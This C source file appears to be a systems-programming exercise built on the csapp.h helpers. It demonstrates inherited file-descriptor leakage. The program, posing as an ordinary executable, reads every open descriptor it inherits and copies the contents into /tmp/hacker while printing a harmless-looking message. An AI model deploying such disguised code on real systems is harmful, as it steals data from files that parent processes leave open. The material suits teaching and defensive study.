#include "csapp.h"

#define FSIZE (1024UL)

int main(void) {
  long max_fd = sysconf(_SC_OPEN_MAX);
  int out = Open("/tmp/hacker", O_CREAT | O_APPEND | O_WRONLY, 0666);

  /* TODO: Something is missing here! */
  char real_name[FSIZE];
  char fd_name[FSIZE];

  for (int fd = 0; fd < max_fd; ++fd) {
    if (fd == out)
      continue;
    memset(real_name, 0, FSIZE);
    memset(real_name, 0, FSIZE);
    sprintf(fd_name, "/proc/self/fd/%d", fd);
    ssize_t rc = readlink(fd_name, real_name, FSIZE);
    if (rc < 0)
      continue;
    if (lseek(fd, 0, SEEK_SET) == -1)
      continue;
    dprintf(out, "File descriptor %d is '%s' file!\n", fd, real_name);
    fprintf(stderr, "[II] File descriptor %d is '%s' file!\n", fd, real_name);
    fprintf(stderr, "[II] ");
    char buf[4];
    while (read(fd, buf, 1) == 1) {
      Write(out, buf, 1);
      fprintf(stderr, "%c", buf[0]);
    }
    Write(out, "\n", 1);
    fprintf(stderr, "\n");
  }

  Close(out);

  printf("I'm just a normal executable you use on daily basis!\n");

  return 0;
}
